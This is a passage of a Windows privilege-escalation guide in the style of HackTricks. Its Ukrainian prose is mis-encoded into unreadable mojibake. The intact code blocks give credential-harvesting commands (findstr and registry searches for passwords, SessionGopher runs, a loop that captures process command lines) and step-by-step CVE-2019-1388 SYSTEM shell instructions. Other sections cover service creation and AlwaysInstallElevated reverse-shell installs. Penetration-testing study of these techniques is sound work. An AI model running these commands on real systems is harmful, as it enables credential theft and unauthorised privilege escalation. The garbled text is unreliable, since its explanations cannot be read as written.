**Component Object Model (COM)** - —Ü–µ —Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ—è, –≤–±—É–¥–æ–≤–∞–Ω–∞ –≤ –æ–ø–µ—Ä–∞—Ü—ñ–π–Ω—É —Å–∏—Å—Ç–µ–º—É Windows, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î **–≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏** –º—ñ–∂ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞–º–∏ –ø—Ä–æ–≥—Ä–∞–º–Ω–æ–≥–æ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è —Ä—ñ–∑–Ω–∏—Ö –º–æ–≤. –ö–æ–∂–µ–Ω –∫–æ–º–ø–æ–Ω–µ–Ω—Ç COM **—ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫—É—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–∞ –∫–ª–∞—Å—É (CLSID)**, –∞ –∫–æ–∂–µ–Ω –∫–æ–º–ø–æ–Ω–µ–Ω—Ç –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å —á–µ—Ä–µ–∑ –æ–¥–∏–Ω –∞–±–æ –∫—ñ–ª—å–∫–∞ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ñ–≤, —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏—Ö –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä—ñ–≤ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ñ–≤ (IIDs).

–ö–ª–∞—Å–∏ —Ç–∞ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∏ COM –≤–∏–∑–Ω–∞—á–∞—é—Ç—å—Å—è –≤ —Ä–µ—î—Å—Ç—Ä—ñ –ø—ñ–¥ **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** —Ç–∞ **HKEY\_**_**CLASSES\_**_**ROOT\Interface** –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ. –¶–µ–π —Ä–µ—î—Å—Ç—Ä —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è —à–ª—è—Ö–æ–º –æ–±'—î–¥–Ω–∞–Ω–Ω—è **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT.**

–£ CLSIDs —Ü—å–æ–≥–æ —Ä–µ—î—Å—Ç—Ä—É –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –¥–æ—á—ñ—Ä–Ω—ñ–π —Ä–µ—î—Å—Ç—Ä **InProcServer32**, —è–∫–∏–π –º—ñ—Å—Ç–∏—Ç—å **–∑–Ω–∞—á–µ–Ω–Ω—è –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º**, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ **DLL** —Ç–∞ –∑–Ω–∞—á–µ–Ω–Ω—è –∑ –Ω–∞–∑–≤–æ—é **ThreadingModel**, —è–∫–µ –º–æ–∂–µ –±—É—Ç–∏ **Apartment** (–æ–¥–Ω–æ–ø–æ—Ç–æ–∫–æ–≤–∏–π), **Free** (–±–∞–≥–∞—Ç–æ–ø–æ—Ç–æ–∫–æ–≤–∏–π), **Both** (–æ–¥–Ω–æ –∞–±–æ –±–∞–≥–∞—Ç–æ) –∞–±–æ **Neutral** (–ø–æ—Ç—ñ–∫ –Ω–µ–π—Ç—Ä–∞–ª—å–Ω–∏–π).

![](<../../.gitbook/assets/image (638).png>)

–ó–∞–∑–≤–∏—á–∞–π, —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ –±—É–¥—å-—è–∫—ñ –∑ DLL**, —è–∫—ñ –±—É–¥—É—Ç—å –≤–∏–∫–æ–Ω–∞–Ω—ñ, –≤–∏ –º–æ–∂–µ—Ç–µ **–ø—ñ–¥–≤–∏—â–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó**, —è–∫—â–æ —Ü—é DLL –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–æ —ñ–Ω—à–∏–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º.

–©–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ –∑–ª–æ—á–∏–Ω—Ü—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å COM Hijacking —è–∫ –º–µ—Ö–∞–Ω—ñ–∑–º –ø–æ—Å—Ç—ñ–π–Ω–æ—Å—Ç—ñ, –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **–ó–∞–≥–∞–ª—å–Ω–∏–π –ø–æ—à—É–∫ –ø–∞—Ä–æ–ª—ñ–≤ —É —Ñ–∞–π–ª–∞—Ö —Ç–∞ —Ä–µ—î—Å—Ç—Ä—ñ**

**–ü–æ—à—É–∫ –≤–º—ñ—Å—Ç—É —Ñ–∞–π–ª—ñ–≤**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**–ü–æ—à—É–∫ —Ñ–∞–π–ª—É –∑–∞ –ø–µ–≤–Ω–æ—é –Ω–∞–∑–≤–æ—é —Ñ–∞–π–ª—É**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**–ü–æ—à—É–∫ —É —Ä–µ—î—Å—Ç—Ä—ñ –Ω–∞–∑–≤ –∫–ª—é—á—ñ–≤ —Ç–∞ –ø–∞—Ä–æ–ª—ñ–≤**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —è–∫—ñ —à—É–∫–∞—é—Ç—å –ø–∞—Ä–æ–ª—ñ

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **—î –ø–ª–∞–≥—ñ–Ω–æ–º msf**, —è–∫–∏–π —è —Å—Ç–≤–æ—Ä–∏–≤ –¥–ª—è **–∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ–≥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–∂–Ω–æ–≥–æ –º–æ–¥—É–ª—è metasploit POST, —è–∫–∏–π —à—É–∫–∞—î –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∂–µ—Ä—Ç–≤–∏.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ —à—É–∫–∞—î –≤—Å—ñ —Ñ–∞–π–ª–∏, —â–æ –º—ñ—Å—Ç—è—Ç—å –ø–∞—Ä–æ–ª—ñ, –∑–≥–∞–¥–∞–Ω—ñ –Ω–∞ —Ü—ñ–π —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) - —â–µ –æ–¥–∏–Ω —á—É–¥–æ–≤–∏–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –≤–∏–ª—É—á–µ–Ω–Ω—è –ø–∞—Ä–æ–ª—ñ–≤ –∑ —Å–∏—Å—Ç–µ–º–∏.

–Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) —à—É–∫–∞—î **—Å–µ—Å—ñ—ó**, **—ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤** —Ç–∞ **–ø–∞—Ä–æ–ª—ñ** –∑ –¥–µ–∫—ñ–ª—å–∫–æ—Ö —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤, —è–∫—ñ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å —Ü—ñ –¥–∞–Ω—ñ —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É –≤–∏–≥–ª—è–¥—ñ (PuTTY, WinSCP, FileZilla, SuperPuTTY —Ç–∞ RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## –í–∏—Ç—ñ–∫ –æ–±—Ä–æ–±–Ω–∏–∫—ñ–≤

–£—è–≤—ñ—Ç—å, —â–æ **–ø—Ä–æ—Ü–µ—Å, —è–∫–∏–π –ø—Ä–∞—Ü—é—î —è–∫ SYSTEM, –≤—ñ–¥–∫—Ä–∏–≤–∞—î –Ω–æ–≤–∏–π –ø—Ä–æ—Ü–µ—Å** (`OpenProcess()`) –∑ **–ø–æ–≤–Ω–∏–º –¥–æ—Å—Ç—É–ø–æ–º**. –¢–æ–π —Å–∞–º–∏–π –ø—Ä–æ—Ü–µ—Å **—Ç–∞–∫–æ–∂ —Å—Ç–≤–æ—Ä—é—î –Ω–æ–≤–∏–π –ø—Ä–æ—Ü–µ—Å** (`CreateProcess()`) **–∑ –Ω–∏–∑—å–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏, –∞–ª–µ —É—Å–ø–∞–¥–∫–æ–≤—É—î –≤—Å—ñ –≤—ñ–¥–∫—Ä–∏—Ç—ñ –æ–±—Ä–æ–±–Ω–∏–∫–∏ –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É**.\
–û—Ç–∂–µ, —è–∫—â–æ —É –≤–∞—Å —î **–ø–æ–≤–Ω–∏–π –¥–æ—Å—Ç—É–ø –¥–æ –ø—Ä–æ—Ü–µ—Å—É –∑ –Ω–∏–∑—å–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏**, –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ **–≤—ñ–¥–∫—Ä–∏—Ç–∏–π –æ–±—Ä–æ–±–Ω–∏–∫ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É, —Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `OpenProcess()` —Ç–∞ **–≤–ø—Ä–æ–≤–∞–¥–∏—Ç–∏ shellcode**.\
[–ü—Ä–æ—á–∏—Ç–∞–π—Ç–µ —Ü–µ–π –ø—Ä–∏–∫–ª–∞–¥ –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –±—ñ–ª—å—à –¥–µ—Ç–∞–ª—å–Ω–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ **—Ç–µ, —è–∫ –≤–∏—è–≤–∏—Ç–∏ —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —Ü—é —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å**.](leaked-handle-exploitation.md)\
[–ü—Ä–æ—á–∏—Ç–∞–π—Ç–µ —Ü–µ–π **—ñ–Ω—à–∏–π –ø–æ—Å—Ç –¥–ª—è –±—ñ–ª—å—à –ø–æ–≤–Ω–æ–≥–æ –ø–æ—è—Å–Ω–µ–Ω–Ω—è —Ç–æ–≥–æ, —è–∫ —Ç–µ—Å—Ç—É–≤–∞—Ç–∏ —Ç–∞ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –±—ñ–ª—å—à–æ—é –∫—ñ–ª—å–∫—ñ—Å—Ç—é –≤—ñ–¥–∫—Ä–∏—Ç–∏—Ö –æ–±—Ä–æ–±–Ω–∏–∫—ñ–≤ –ø—Ä–æ—Ü–µ—Å—ñ–≤ —Ç–∞ –ø–æ—Ç–æ–∫—ñ–≤, —É—Å–ø–∞–¥–∫–æ–≤–∞–Ω–∏—Ö –∑ —Ä—ñ–∑–Ω–∏–º–∏ —Ä—ñ–≤–Ω—è–º–∏ –¥–æ–∑–≤–æ–ª—ñ–≤ (–Ω–µ —Ç—ñ–ª—å–∫–∏ –ø–æ–≤–Ω–∏–π –¥–æ—Å—Ç—É–ø)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## –Ü–º—ñ—Ç–∞—Ü—ñ—è –∫–ª—ñ—î–Ω—Ç–∞ –∑ —ñ–º–µ–Ω–æ–≤–∞–Ω–∏–º–∏ –∫–∞–Ω–∞–ª–∞–º–∏

–°–ø—ñ–ª—å–Ω—ñ —Å–µ–≥–º–µ–Ω—Ç–∏ –ø–∞–º'—è—Ç—ñ, –≤—ñ–¥–æ–º—ñ —è–∫ **–∫–∞–Ω–∞–ª–∏**, –¥–æ–∑–≤–æ–ª—è—é—Ç—å –≤–∑–∞—î–º–æ–¥—ñ—é –ø—Ä–æ—Ü–µ—Å—ñ–≤ —Ç–∞ –ø–µ—Ä–µ–¥–∞—á—É –¥–∞–Ω–∏—Ö.

Windows –Ω–∞–¥–∞—î —Ñ—É–Ω–∫—Ü—ñ—é –ø—ñ–¥ –Ω–∞–∑–≤–æ—é **–Ü–º–µ–Ω–æ–≤–∞–Ω—ñ –∫–∞–Ω–∞–ª–∏**, —â–æ –¥–æ–∑–≤–æ–ª—è—î –Ω–µ—Å–ø–æ—Ä—ñ–¥–Ω–µ–Ω–∏–º –ø—Ä–æ—Ü–µ—Å–∞–º –æ–±–º—ñ–Ω—é–≤–∞—Ç–∏—Å—è –¥–∞–Ω–∏–º–∏, –Ω–∞–≤—ñ—Ç—å —á–µ—Ä–µ–∑ —Ä—ñ–∑–Ω—ñ –º–µ—Ä–µ–∂—ñ. –¶–µ –Ω–∞–≥–∞–¥—É—î –∞—Ä—Ö—ñ—Ç–µ–∫—Ç—É—Ä—É –∫–ª—ñ—î–Ω—Ç-—Å–µ—Ä–≤–µ—Ä, –∑ —Ä–æ–ª—è–º–∏, –≤–∏–∑–Ω–∞—á–µ–Ω–∏–º–∏ —è–∫ **—ñ–º–µ–Ω–æ–≤–∞–Ω–∏–π –∫–∞–Ω–∞–ª —Å–µ—Ä–≤–µ—Ä–∞** —Ç–∞ **—ñ–º–µ–Ω–æ–≤–∞–Ω–∏–π –∫–∞–Ω–∞–ª –∫–ª—ñ—î–Ω—Ç–∞**.

–ö–æ–ª–∏ –¥–∞–Ω—ñ –Ω–∞–¥—Å–∏–ª–∞—é—Ç—å—Å—è —á–µ—Ä–µ–∑ –∫–∞–Ω–∞–ª –∫–ª—ñ—î–Ω—Ç–æ–º, **—Å–µ—Ä–≤–µ—Ä**, —è–∫–∏–π –Ω–∞–ª–∞—à—Ç—É–≤–∞–≤ –∫–∞–Ω–∞–ª, –º–æ–∂–µ **–ø—Ä–∏–π–Ω—è—Ç–∏ —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å** **–∫–ª—ñ—î–Ω—Ç–∞**, —è–∫—â–æ –≤—ñ–Ω –º–∞—î –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ **–ø—Ä–∞–≤–∞ SeImpersonate**. –í–∏—è–≤–ª–µ–Ω–Ω—è **–ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É**, —è–∫–∏–π —Å–ø—ñ–ª–∫—É—î—Ç—å—Å—è —á–µ—Ä–µ–∑ –∫–∞–Ω–∞–ª, —è–∫–∏–π –≤–∏ –º–æ–∂–µ—Ç–µ —ñ–º—ñ—Ç—É–≤–∞—Ç–∏, –Ω–∞–¥–∞—î –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å **–æ—Ç—Ä–∏–º–∞—Ç–∏ –≤–∏—â—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó**, –ø—Ä–∏–π–º–∞—é—á–∏ —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å —Ü—å–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É, –∫–æ–ª–∏ –≤—ñ–Ω –≤–∑–∞—î–º–æ–¥—ñ—î –∑ –∫–∞–Ω–∞–ª–æ–º, —è–∫–∏–π –≤–∏ —Å—Ç–≤–æ—Ä–∏–ª–∏. –Ü–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó —â–æ–¥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ç–∞–∫–æ–≥–æ –Ω–∞–ø–∞–¥—É –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ [**—Ç—É—Ç**](named-pipe-client-impersonation.md) —Ç–∞ [**—Ç—É—Ç**](./#from-high-integrity-to-system).

–¢–∞–∫–æ–∂ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–æ–∑–≤–æ–ª—è—î **–ø–µ—Ä–µ—Ö–æ–ø–ª—é–≤–∞—Ç–∏ –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—é —á–µ—Ä–µ–∑ —ñ–º–µ–Ω–æ–≤–∞–Ω–∏–π –∫–∞–Ω–∞–ª –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—É, —Ç–∞–∫–æ–≥–æ —è–∫ burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **—ñ —Ü–µ–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–æ–∑–≤–æ–ª—è—î –ø–µ—Ä–µ–≥–ª—è–¥–∞—Ç–∏ —Ç–∞ –ø–µ—Ä–µ–≥–ª—è–¥–∞—Ç–∏ –≤—Å—ñ –∫–∞–Ω–∞–ª–∏ –¥–ª—è –ø–æ—à—É–∫—É –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## –†—ñ–∑–Ω–µ

### **–ú–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥ –∫–æ–º–∞–Ω–¥–Ω–∏—Ö —Ä—è–¥–∫—ñ–≤ –¥–ª—è –ø–∞—Ä–æ–ª—ñ–≤**

–û—Ç—Ä–∏–º–∞–≤—à–∏ –æ–±–æ–ª–æ–Ω–∫—É —è–∫ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á, –º–æ–∂—É—Ç—å –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏—Å—è –∑–∞–ø–ª–∞–Ω–æ–≤–∞–Ω—ñ –∑–∞–≤–¥–∞–Ω–Ω—è –∞–±–æ —ñ–Ω—à—ñ –ø—Ä–æ—Ü–µ—Å–∏, —è–∫—ñ **–ø–µ—Ä–µ–¥–∞—é—Ç—å –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ —á–µ—Ä–µ–∑ –∫–æ–º–∞–Ω–¥–Ω–∏–π —Ä—è–¥–æ–∫**. –°—Ü–µ–Ω–∞—Ä—ñ–π –Ω–∏–∂—á–µ –∑–∞—Ö–æ–ø–ª—é—î –∫–æ–º–∞–Ω–¥–Ω—ñ —Ä—è–¥–∫–∏ –ø—Ä–æ—Ü–µ—Å—ñ–≤ –∫–æ–∂–Ω—ñ –¥–≤—ñ —Å–µ–∫—É–Ω–¥–∏ —Ç–∞ –ø–æ—Ä—ñ–≤–Ω—é—î –ø–æ—Ç–æ—á–Ω–∏–π —Å—Ç–∞–Ω –∑ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–º, –≤–∏–≤–æ–¥—è—á–∏ –±—É–¥—å-—è–∫—ñ –≤—ñ–¥–º—ñ–Ω–Ω–æ—Å—Ç—ñ.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## –í–∏–∫—Ä–∞–¥–µ–Ω–Ω—è –ø–∞—Ä–æ–ª—ñ–≤ –∑ –ø—Ä–æ—Ü–µ—Å—ñ–≤

## –í—ñ–¥ –Ω–∏–∑—å–∫–æ–ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–æ NT\AUTHORITY SYSTEM (CVE-2019-1388) / –£—Ö–∏–ª–µ–Ω–Ω—è –≤—ñ–¥ UAC

–Ø–∫—â–æ —É –≤–∞—Å —î –¥–æ—Å—Ç—É–ø –¥–æ –≥—Ä–∞—Ñ—ñ—á–Ω–æ–≥–æ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—É (—á–µ—Ä–µ–∑ –∫–æ–Ω—Å–æ–ª—å –∞–±–æ RDP) —ñ UAC —É–≤—ñ–º–∫–Ω–µ–Ω–æ, —É –¥–µ—è–∫–∏—Ö –≤–µ—Ä—Å—ñ—è—Ö Microsoft Windows –º–æ–∂–ª–∏–≤–æ –∑–∞–ø—É—Å—Ç–∏—Ç–∏ —Ç–µ—Ä–º—ñ–Ω–∞–ª –∞–±–æ –±—É–¥—å-—è–∫–∏–π —ñ–Ω—à–∏–π –ø—Ä–æ—Ü–µ—Å, —Ç–∞–∫–∏–π —è–∫ "NT\AUTHORITY SYSTEM" –≤—ñ–¥ –Ω–µ–ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.

–¶–µ –¥–æ–∑–≤–æ–ª—è—î –ø—ñ–¥–≤–∏—â–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó —Ç–∞ —É—Ö–∏–ª–∏—Ç–∏—Å—è –≤—ñ–¥ UAC –æ–¥–Ω–æ—á–∞—Å–Ω–æ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –æ–¥–Ω—ñ—î—ó –π —Ç—ñ—î—ó –∂ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ. –ö—Ä—ñ–º —Ç–æ–≥–æ, –Ω–µ–º–∞—î –ø–æ—Ç—Ä–µ–±–∏ –≤—Å—Ç–∞–Ω–æ–≤–ª—é–≤–∞—Ç–∏ —â–æ-–Ω–µ–±—É–¥—å, –∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –ø—ñ–¥ —á–∞—Å –ø—Ä–æ—Ü–µ—Å—É –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª –ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π —ñ –≤–∏–¥–∞–Ω–∏–π Microsoft.

–î–µ—è–∫—ñ –∑ –ø–æ—Å—Ç—Ä–∞–∂–¥–∞–ª–∏—Ö —Å–∏—Å—Ç–µ–º –Ω–∞—Å—Ç—É–ø–Ω—ñ:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
–î–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ü—ñ—î—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ –∫—Ä–æ–∫–∏:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
–£ –≤–∞—Å —î –≤—Å—ñ –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ —Ñ–∞–π–ª–∏ —Ç–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è —É –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó GitHub:

https://github.com/jas502n/CVE-2019-1388

## –í—ñ–¥ —Å–µ—Ä–µ–¥–Ω—å–æ–≥–æ –¥–æ –≤–∏—Å–æ–∫–æ–≥–æ —Ä—ñ–≤–Ω—è —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ / –£—Ö–∏–ª–µ–Ω–Ω—è UAC

–ü—Ä–æ—á–∏—Ç–∞–π—Ç–µ —Ü–µ, —â–æ–± **–¥—ñ–∑–Ω–∞—Ç–∏—Å—è –ø—Ä–æ —Ä—ñ–≤–Ω—ñ —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ**:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

–ü–æ—Ç—ñ–º **–ø—Ä–æ—á–∏—Ç–∞–π—Ç–µ —Ü–µ, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è –ø—Ä–æ UAC —Ç–∞ —É—Ö–∏–ª–µ–Ω–Ω—è UAC:**

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## **–í—ñ–¥ –≤–∏—Å–æ–∫–æ–≥–æ —Ä—ñ–≤–Ω—è –¥–æ —Å–∏—Å—Ç–µ–º–∏**

### **–ù–æ–≤–∏–π —Å–µ—Ä–≤—ñ—Å**

–Ø–∫—â–æ –≤–∏ –≤–∂–µ –ø—Ä–∞—Ü—é—î—Ç–µ —É –ø—Ä–æ—Ü–µ—Å—ñ –≤–∏—Å–æ–∫–æ–≥–æ —Ä—ñ–≤–Ω—è —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ, **–ø–µ—Ä–µ—Ö—ñ–¥ –¥–æ SYSTEM** –º–æ–∂–µ –±—É—Ç–∏ –ª–µ–≥–∫–∏–º, –ø—Ä–æ—Å—Ç–æ **—Å—Ç–≤–æ—Ä–∏–≤—à–∏ —Ç–∞ –≤–∏–∫–æ–Ω–∞–≤—à–∏ –Ω–æ–≤–∏–π —Å–µ—Ä–≤—ñ—Å**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

–ó –≤–∏—Å–æ–∫–æ–ø—Ä—ñ–æ—Ä–∏—Ç–µ—Ç–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **—É–≤—ñ–º–∫–Ω—É—Ç–∏ –∑–∞–ø–∏—Å–∏ —Ä–µ—î—Å—Ç—Ä—É AlwaysInstallElevated** —Ç–∞ **–≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏** –∑–≤–æ—Ä–æ—Ç–Ω–∏–π —à–µ–ª, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –æ–±–≥–æ—Ä—Ç–∫—É _**.msi**_.\
[–î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω—ñ –∫–ª—é—á—ñ —Ä–µ—î—Å—Ç—Ä—É —Ç–∞ —è–∫ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –ø–∞–∫–µ—Ç _.msi_ —Ç—É—Ç.](./#alwaysinstallelevated)

### High + –ø—Ä–∏–≤—ñ–ª–µ–π SeImpersonate –¥–æ System

**–í–∏ –º–æ–∂–µ—Ç–µ** [**–∑–Ω–∞–π—Ç–∏ –∫–æ–¥ —Ç—É—Ç**](seimpersonate-from-high-to-system.md)**.**

